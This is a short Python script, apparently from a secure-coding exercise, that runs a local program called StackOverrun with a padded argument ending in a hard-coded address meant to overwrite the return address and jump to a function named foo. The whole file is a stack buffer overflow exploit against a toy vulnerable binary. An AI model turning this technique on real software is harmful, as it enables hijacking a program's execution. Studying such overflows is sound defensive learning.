from subprocess import call

def main():

    addressOfFoo = "\x43\x62\x55\x56"
    call(["./StackOverrun", "AAAAAAAAAAAAAAAAAAAAAA\x43\x62\x55\x56"])

   
main()
